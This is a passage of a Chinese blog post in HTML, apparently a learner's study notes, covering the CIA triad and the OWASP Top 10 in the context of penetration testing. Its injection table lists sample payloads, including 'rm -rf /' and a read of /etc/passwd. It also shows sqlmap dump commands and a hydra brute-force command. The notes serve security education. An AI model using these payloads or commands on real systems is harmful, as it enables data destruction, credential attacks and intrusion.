@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Day1 CIA三元组、OWASP TOP101这一部分我决定先粗略看一遍，搭建整体框架，再慢慢学习细节。了解TOP10每一个的原理；大概掌握测试流程，之前学习的内容有点杂，还是需要系统学习一下。  CIA三元组：信息安全的核心基石CIA三元组是信息安全的三个核心原则，代表 机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。它是所有安全策略">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day1 CIA三元组、OWASP TOP10">
+<meta property="og:url" content="http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/index.html">
+<meta property="og:site_name" content="P1ant731">
+<meta property="og:description" content="Day1 CIA三元组、OWASP TOP101这一部分我决定先粗略看一遍，搭建整体框架，再慢慢学习细节。了解TOP10每一个的原理；大概掌握测试流程，之前学习的内容有点杂，还是需要系统学习一下。  CIA三元组：信息安全的核心基石CIA三元组是信息安全的三个核心原则，代表 机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。它是所有安全策略">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-23T02:16:28.000Z">
+<meta property="article:modified_time" content="2025-04-23T02:18:16.133Z">
+<meta property="article:author" content="P1ant731">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Day1 CIA三元组、OWASP TOP10</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/22/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&text=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&is_video=false&description=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Day1 CIA三元组、OWASP TOP10&body=Check out this article: http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&name=Day1 CIA三元组、OWASP TOP10&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&t=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10"><span class="toc-number">1.</span> <span class="toc-text">Day1 CIA三元组、OWASP TOP10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CIA%E4%B8%89%E5%85%83%E7%BB%84%EF%BC%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9F%BA%E7%9F%B3"><span class="toc-number">1.1.</span> <span class="toc-text">CIA三元组：信息安全的核心基石</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%BA%E5%AF%86%E6%80%A7%EF%BC%88Confidentiality%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 机密性（Confidentiality）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%88Integrity%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 完整性（Integrity）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%88Availability%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 可用性（Availability）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CIA%E7%9A%84%E5%B9%B3%E8%A1%A1%E4%B8%8E%E5%86%B2%E7%AA%81"><span class="toc-number">1.1.4.</span> <span class="toc-text">CIA的平衡与冲突</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CIA%E7%9A%84%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.5.</span> <span class="toc-text">CIA的扩展模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.1.6.</span> <span class="toc-text">实战中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.1.7.</span> <span class="toc-text">经典案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-Top-10"><span class="toc-number">1.2.</span> <span class="toc-text">OWASP Top 10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88Injection%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 注入攻击（Injection）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%B1%E6%95%88%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%88Broken-Authentication%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 失效的身份认证（Broken Authentication）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%EF%BC%88Sensitive-Data-Exposure%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 敏感数据泄露（Sensitive Data Exposure）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%88XXE%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. XML外部实体注入（XXE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%88Broken-Access-Control%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">5. 失效的访问控制（Broken Access Control）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%EF%BC%88Security-Misconfiguration%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">6. 安全配置错误（Security Misconfiguration）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89"><span class="toc-number">1.2.7.</span> <span class="toc-text">7. 跨站脚本（XSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Insecure-Deserialization%EF%BC%89"><span class="toc-number">1.2.8.</span> <span class="toc-text">8. 不安全的反序列化（Insecure Deserialization）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">2. 攻击场景与漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">3. 检测与漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">4. 防御方案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%8E%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.8.5.</span> <span class="toc-text">5. 实战靶场与工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.8.6.</span> <span class="toc-text">6. 漏洞案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E9%AB%98%E7%BA%A7%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.8.7.</span> <span class="toc-text">7. 高级绕过技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BC%81%E4%B8%9A%E7%BA%A7%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.8.8.</span> <span class="toc-text">8. 企业级防护建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BD%BF%E7%94%A8%E5%90%AB%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6%EF%BC%88Using-Components-with-Known-Vulnerabilities%EF%BC%89"><span class="toc-number">1.2.9.</span> <span class="toc-text">9. 使用含已知漏洞的组件（Using Components with Known Vulnerabilities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%97%A5%E5%BF%97%E4%B8%8E%E7%9B%91%E6%8E%A7%E4%B8%8D%E8%B6%B3%EF%BC%88Insufficient-Logging-Monitoring%EF%BC%89"><span class="toc-number">1.2.10.</span> <span class="toc-text">10. 日志与监控不足（Insufficient Logging &amp; Monitoring）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8OWASP-Top-10%EF%BC%9F"><span class="toc-number">1.2.11.</span> <span class="toc-text">如何利用OWASP Top 10？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B%EF%BC%88PTES%E6%A0%87%E5%87%86-%E5%AE%9E%E6%88%98%E7%BB%86%E5%8C%96%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">渗透测试标准流程（PTES标准 + 实战细化）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E6%98%8E%E7%A1%AE%E8%8C%83%E5%9B%B4%E4%B8%8E%E8%A7%84%E5%88%99"><span class="toc-number">1.3.1.</span> <span class="toc-text">阶段 1：明确范围与规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88Reconnaissance%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">阶段 2：信息收集（Reconnaissance）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">阶段 3：漏洞扫描与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-4%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F%EF%BC%88Post-Exploitation%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">阶段 4：后渗透（Post-Exploitation）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-5%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88Persistence%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">阶段 5：权限维持（Persistence）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-6%EF%BC%9A%E6%8A%A5%E5%91%8A%E6%92%B0%E5%86%99"><span class="toc-number">1.3.6.</span> <span class="toc-text">阶段 6：报告撰写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.3.7.</span> <span class="toc-text">渗透测试流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7"><span class="toc-number">1.3.8.</span> <span class="toc-text">实战技巧</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Day1 CIA三元组、OWASP TOP10
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">P1ant731</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-23T02:16:28.000Z" class="dt-published" itemprop="datePublished">2025-04-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Day1-CIA三元组、OWASP-TOP10"><a href="#Day1-CIA三元组、OWASP-TOP10" class="headerlink" title="Day1 CIA三元组、OWASP TOP10"></a>Day1 CIA三元组、OWASP TOP10</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这一部分我决定先粗略看一遍，搭建整体框架，再慢慢学习细节。了解TOP10每一个的原理；大概掌握测试流程，之前学习的内容有点杂，还是需要系统学习一下。</span><br></pre></td></tr></table></figure>
+
+<h2 id="CIA三元组：信息安全的核心基石"><a href="#CIA三元组：信息安全的核心基石" class="headerlink" title="CIA三元组：信息安全的核心基石"></a><strong>CIA三元组：信息安全的核心基石</strong></h2><p><strong>CIA三元组</strong>是信息安全的三个核心原则，代表 <strong>机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）</strong>。它是所有安全策略、技术和措施的设计基础。以下是详细解析：</p>
+<hr>
+<h3 id="1-机密性（Confidentiality）"><a href="#1-机密性（Confidentiality）" class="headerlink" title="1. 机密性（Confidentiality）"></a><strong>1. 机密性（Confidentiality）</strong></h3><p><strong>定义</strong>：确保信息仅被授权的人或系统访问，防止未授权的泄露。<br><strong>关键技术与场景</strong>：</p>
+<p><strong>加密技术</strong>：</p>
+<p>对称加密（AES、DES）与非对称加密（RSA、ECC）。</p>
+<p>传输层加密（TLS&#x2F;SSL）。</p>
+<p><strong>访问控制</strong>：</p>
+<p>身份认证（密码、多因素认证）。</p>
+<p>权限管理（RBAC：基于角色的访问控制）。</p>
+<p><strong>场景示例</strong>：</p>
+<p>数据库加密保护用户隐私数据。</p>
+<p>VPN保护远程通信不被窃听。</p>
+<p><strong>攻击威胁</strong>：</p>
+<p>数据窃取（如SQL注入获取数据库内容）。</p>
+<p>中间人攻击（拦截未加密通信）。</p>
+<hr>
+<h3 id="2-完整性（Integrity）"><a href="#2-完整性（Integrity）" class="headerlink" title="2. 完整性（Integrity）"></a><strong>2. 完整性（Integrity）</strong></h3><p><strong>定义</strong>：确保数据在传输或存储过程中未被篡改、破坏或意外修改。<br><strong>关键技术与场景</strong>：</p>
+<p><strong>哈希校验</strong>：</p>
+<p>使用SHA-256生成数据指纹。</p>
+<p><strong>数字签名</strong>：</p>
+<p>结合非对称加密和哈希算法（如RSA+SHA256）。</p>
+<p><strong>防篡改机制</strong>：</p>
+<p>区块链技术（通过共识机制保证数据不可篡改）。</p>
+<p><strong>场景示例</strong>：</p>
+<p>软件下载时验证SHA256哈希值是否匹配。</p>
+<p>银行交易使用数字签名确保交易内容未被修改。</p>
+<p><strong>攻击威胁</strong>：</p>
+<p>中间人篡改（如HTTP流量注入恶意代码）。</p>
+<p>恶意软件篡改系统文件（如Rootkit）。</p>
+<hr>
+<h3 id="3-可用性（Availability）"><a href="#3-可用性（Availability）" class="headerlink" title="3. 可用性（Availability）"></a><strong>3. 可用性（Availability）</strong></h3><p><strong>定义</strong>：确保授权用户能随时访问所需的信息和资源。<br><strong>关键技术与场景</strong>：</p>
+<p><strong>容灾备份</strong>：</p>
+<p>异地多活数据中心、RAID磁盘阵列。</p>
+<p><strong>抗DDoS</strong>：</p>
+<p>流量清洗、CDN分发、云防火墙（如Cloudflare）。</p>
+<p><strong>冗余设计</strong>：</p>
+<p>负载均衡（Nginx、HAProxy）、高可用集群。</p>
+<p><strong>场景示例</strong>：</p>
+<p>电商网站在“双11”期间抵御高并发流量。</p>
+<p>医院系统通过备份服务器避免宕机影响患者数据。</p>
+<p><strong>攻击威胁</strong>：</p>
+<p>DDoS攻击（如SYN Flood耗尽服务器资源）。</p>
+<p>勒索软件加密数据导致服务不可用。</p>
+<hr>
+<h3 id="CIA的平衡与冲突"><a href="#CIA的平衡与冲突" class="headerlink" title="CIA的平衡与冲突"></a><strong>CIA的平衡与冲突</strong></h3><p>在实际应用中，三者可能需权衡取舍：</p>
+<p><strong>机密性 vs 可用性</strong>：</p>
+<p>严格加密（如全盘加密）可能降低系统性能。</p>
+<p><strong>完整性 vs 可用性</strong>：</p>
+<p>实时数据同步（如金融交易）可能因校验延迟影响用户体验。</p>
+<hr>
+<h3 id="CIA的扩展模型"><a href="#CIA的扩展模型" class="headerlink" title="CIA的扩展模型"></a><strong>CIA的扩展模型</strong></h3><p>现代安全模型在CIA基础上新增其他原则：</p>
+<p><strong>不可否认性（Non-repudiation）</strong>：</p>
+<p>通过数字签名确保用户不能否认自己的行为（如邮件签名）。</p>
+<p><strong>可追溯性（Accountability）</strong>：</p>
+<p>日志审计追踪操作者（如Linux的<code>auditd</code>服务）。</p>
+<hr>
+<h3 id="实战中的应用"><a href="#实战中的应用" class="headerlink" title="实战中的应用"></a><strong>实战中的应用</strong></h3><ol>
+<li><p><strong>渗透测试</strong>：</p>
+<p>测试机密性：尝试绕过认证获取敏感数据。</p>
+<p>测试完整性：篡改API请求参数验证服务端校验。</p>
+<p>测试可用性：模拟DDoS攻击验证防护措施。</p>
+</li>
+<li><p><strong>安全防护</strong>：</p>
+<p>机密性→加密数据库；完整性→HIDS（主机入侵检测）；可用性→备份容灾。</p>
+</li>
+</ol>
+<hr>
+<h3 id="经典案例"><a href="#经典案例" class="headerlink" title="经典案例"></a><strong>经典案例</strong></h3><p><strong>破坏机密性</strong>：2017年Equifax数据泄露（1.43亿用户数据未加密）。</p>
+<p><strong>破坏完整性</strong>：2016年孟加拉央行SWIFT系统被篡改（损失8100万美元）。</p>
+<p><strong>破坏可用性</strong>：2021年Colonial Pipeline遭勒索软件攻击（燃油管道停运）。</p>
+<p>掌握CIA三元组，是理解所有安全技术（如渗透测试、安全运维、合规审计）的基础！</p>
+<h2 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a><strong>OWASP Top 10</strong></h2><p><strong>OWASP（Open Web Application Security Project）</strong> 是国际权威的Web安全组织，其发布的 <strong>Top 10</strong> 列出了当前最严重的Web应用安全风险，帮助开发者、渗透测试人员和安全团队聚焦核心威胁。以下是 <strong>2021版OWASP Top 10</strong> 的深度解析（2024年仍广泛适用）。</p>
+<hr>
+<h3 id="1-注入攻击（Injection）"><a href="#1-注入攻击（Injection）" class="headerlink" title="1. 注入攻击（Injection）"></a><strong>1. 注入攻击（Injection）</strong></h3><p><strong>漏洞原理</strong></p>
+<p>当用户输入被拼接到代码&#x2F;命令中且未正确过滤时，攻击者可插入恶意指令，导致数据库、操作系统或解释器执行非预期操作。</p>
+<p><strong>攻击类型与Payload</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>类型</strong></th>
+<th align="left"><strong>示例Payload</strong></th>
+<th align="left"><strong>影响</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>SQL注入</strong></td>
+<td align="left"><code>&#39; OR 1=1 --</code></td>
+<td align="left">绕过登录、泄露数据库</td>
+</tr>
+<tr>
+<td align="left"><strong>命令注入</strong></td>
+<td align="left"><code>; rm -rf /</code> 或 <code>cat /etc/passwd</code></td>
+<td align="left">服务器文件删除&#x2F;读取</td>
+</tr>
+<tr>
+<td align="left"><strong>NoSQL注入</strong></td>
+<td align="left"><code>&#123;&quot;$gt&quot;: &quot;&quot;&#125;</code> （MongoDB查询绕过）</td>
+<td align="left">未授权数据访问</td>
+</tr>
+<tr>
+<td align="left"><strong>LDAP注入</strong></td>
+<td align="left"><code>*)(uid=*))(uid=*</code></td>
+<td align="left">绕过目录服务认证</td>
+</tr>
+</tbody></table>
+<p><strong>防御方案</strong></p>
+<ul>
+<li><p><strong>代码层</strong>：</p>
+<ul>
+<li><p>使用参数化查询（Prepared Statements）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java示例（正确）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userInput);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>输入白名单校验（如仅允许字母数字）。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>架构层</strong>：</p>
+<ul>
+<li>最小权限原则（数据库账号仅限<code>SELECT</code>必要表）。</li>
+<li>WAF（Web应用防火墙）过滤常见注入特征。</li>
+</ul>
+</li>
+</ul>
+<p><strong>实战工具</strong></p>
+<ul>
+<li><p><strong>SQLmap</strong>（自动化注入）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com?id=1&quot;</span> --dbs  <span class="comment"># 枚举数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com?id=1&quot;</span> --dump  <span class="comment"># 导出数据</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Burp Suite</strong>：手动修改请求测试注入点。</p>
+</li>
+</ul>
+<hr>
+<h3 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2. 失效的身份认证（Broken Authentication）"></a><strong>2. 失效的身份认证（Broken Authentication）</strong></h3><p><strong>常见漏洞场景</strong></p>
+<ol>
+<li><strong>弱密码</strong>：<ul>
+<li>默认凭证（<code>admin/admin</code>）、常见密码（<code>123456</code>）。</li>
+</ul>
+</li>
+<li><strong>会话固定</strong>：<ul>
+<li>登录后未更新Session ID，攻击者可劫持会话。</li>
+</ul>
+</li>
+<li><strong>密码重置漏洞</strong>：<ul>
+<li>通过修改<code>user_id</code>参数重置他人密码。</li>
+</ul>
+</li>
+</ol>
+<p><strong>攻击案例</strong></p>
+<ul>
+<li><p><strong>爆破管理员密码</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P rockyou.txt http-post-form <span class="string">&quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>JWT令牌篡改</strong>：<br>修改未签名的JWT的<code>&#123;&quot;role&quot;:&quot;user&quot;&#125;</code>→<code>&#123;&quot;role&quot;:&quot;admin&quot;&#125;</code>。</p>
+</li>
+</ul>
+<p><strong>防御方案</strong></p>
